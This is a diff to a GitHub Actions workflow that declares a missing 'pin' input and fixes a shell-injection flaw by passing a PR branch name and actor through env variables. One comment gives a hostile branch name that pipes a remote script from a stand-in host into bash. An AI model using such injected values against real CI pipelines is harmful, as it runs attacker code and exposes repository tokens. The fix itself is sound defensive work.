@@ -1155,6 +1155,16 @@ on:
         description: Specific issue number to update
         required: false
         type: string
+      # Read in three places by the dashboard job, but never declared here, so
+      # the \`|| 'true'\` fallback always won and the toggle was unreachable
+      # from the Actions UI. Declared as a boolean default-true to match that
+      # fallback: unchecking it now yields the string 'false', which is truthy
+      # to \`||\` and so survives to the step.
+      pin:
+        description: Pin the dashboard issue
+        required: false
+        default: true
+        type: boolean
       # Common inputs
       dry_run:
         description: Dry run (preview only)
@@ -1202,6 +1212,15 @@ jobs:
     steps:
       - name: Determine which jobs to run
         id: determine
+        # A PR branch name is attacker-chosen text. Interpolated straight into
+        # the script below, a branch called \`x";curl evil.sh|bash;"\` executed
+        # in the runner — and this workflow carries BUDDY_BOT_TOKEN (a PAT with
+        # repo and workflow scopes) in its environment, which a same-repo PR
+        # does receive. Passing these through \`env\` keeps them as shell values
+        # that are never parsed as script.
+        env:
+          PR_ACTOR: \${{ github.actor }}
+          PR_BRANCH: \${{ github.event.pull_request.head.ref }}
         run: |
           # Default to not running any jobs
           echo "run_check=false" >> \$GITHUB_OUTPUT
@@ -1211,8 +1230,8 @@ jobs:
           if [ "\${{ github.event_name }}" = "pull_request" ]; then
             # PR body was edited — check if it's a buddy-bot PR with rebase checkbox
             # Only run the check job (lightweight: just scans for the checkbox and rebases)
-            ACTOR="\${{ github.actor }}"
-            BRANCH="\${{ github.event.pull_request.head.ref }}"
+            ACTOR="\$PR_ACTOR"
+            BRANCH="\$PR_BRANCH"
 
             # Skip if the edit was made by a bot (prevents cascade loops where
             # buddy-bot updates a PR body → fires edited event → re-triggers workflow)
